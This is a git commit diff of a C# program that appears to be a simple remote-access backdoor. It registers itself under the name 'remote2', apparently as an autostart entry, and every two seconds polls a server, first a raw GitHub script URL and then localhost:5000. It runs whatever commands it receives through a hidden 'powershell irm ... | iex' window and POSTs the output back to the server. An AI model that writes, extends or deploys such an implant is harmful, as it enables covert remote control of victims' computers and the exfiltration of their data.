5c7e00d665af51cc7d63242f2560ce645ee38d6f
Scopper31 <84668306+Scopper31@users.noreply.github.com>
2023-01-23 23:54:26 +0300

    Update main.cs

--- main.cs
+++ main.cs
@@ -2,7 +2,10 @@ using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.Net;
+using System.Reflection.Metadata;
 using System.Runtime.InteropServices;
+using System.Text;
+using System.Web;
 using System.Xml.Linq;
 using static System.Net.Mime.MediaTypeNames;
 
@@ -10,6 +13,8 @@ namespace CMDCommandUsingCsharp
 {
     public class Program
     {
+
+        static string URL = "http://127.0.0.1:5000";
         static void Autoload()
         {
             string name = "remote2";
@@ -21,32 +26,56 @@ namespace CMDCommandUsingCsharp
         static bool Check(string URL)
         {
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
-            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
-
-            StreamReader reader = new StreamReader(response.GetResponseStream());
-            string content = reader.ReadToEnd();
-            if (content != "\n")
-            {
-                return true;
+            try {
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse(); 
+                StreamReader reader = new StreamReader(response.GetResponseStream());
+                string content = reader.ReadToEnd();
+                if (content != "")
+                {
+                    return true;
+                }
+                return false;
             }
-            return false;
+            catch (System.Net.WebException) { return false; }
+        }
+
+
+        static async Task clear() {
+
+            using (var client = new HttpClient())
+            {
+                var response = await client.GetAsync($"{URL}/clear");
+            }
+        }
+
+        static async Task answer(string ans)
+        {
+
+            using (var client = new HttpClient())
+            {
+                using (var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "out", $"{ans}" } } ))
+                {
+                    var response = await client.PostAsync($"{URL}", content);
+                }
+            }
         }
 
 
         static void Main(string[] args)
         {
             Autoload();
-            string url = "https://raw.githubusercontent.com/Scopper31/shit/main/cmnd2.ps1";
-
+            string URLcmd = $"{URL}/cmd";
+            /*Encoding utf8 = Encoding.GetEncoding("UTF-8");
+            Encoding win1251 = CodePagesEncodingProvider.Instance.GetEncoding(1251);*/
 
             while (true)
             {
-                if (Check(url))
+                if (Check(URLcmd))
                 {
                     var proc1 = new ProcessStartInfo();
 
                     // '/c' tells cmd that we want it to execute the command that follows, and then exit.
-                    System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", $"/c irm {url} | iex");
+                    System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", $"/c irm {URLcmd} | iex");
 
                     // The following commands are needed to redirect the standard output. 
                     //This means that it will be redirected to the Process.StandardOutput StreamReader.
@@ -54,18 +83,30 @@ namespace CMDCommandUsingCsharp
                     procStartInfo.UseShellExecute = false;
                     // Do not create the black window.
                     procStartInfo.CreateNoWindow = true;
+
                     // Now we create a process, assign its ProcessStartInfo and start it
                     System.Diagnostics.Process proc = new System.Diagnostics.Process();
                     proc.StartInfo = procStartInfo;
                     proc.Start();
 
                     // Get the output into a string
-                    //string result = proc.StandardOutput.ReadToEnd();
+                    string result = proc.StandardOutput.ReadToEnd();
 
+                    string path = "Example.txt";
+                    if (File.Exists(path))
+                    {
+                        TextWriter tw = new StreamWriter(path);
+                        tw.WriteLine(result);
+                        tw.Close();
+                    }
+
+                    Task task1 = answer(result);
                     // Display the command output.
                     //Console.WriteLine(result);
-                    Thread.Sleep(2000);
+                    
+                    Task task2 = clear();
                 }
+                Thread.Sleep(2000);
             }
         }
     }
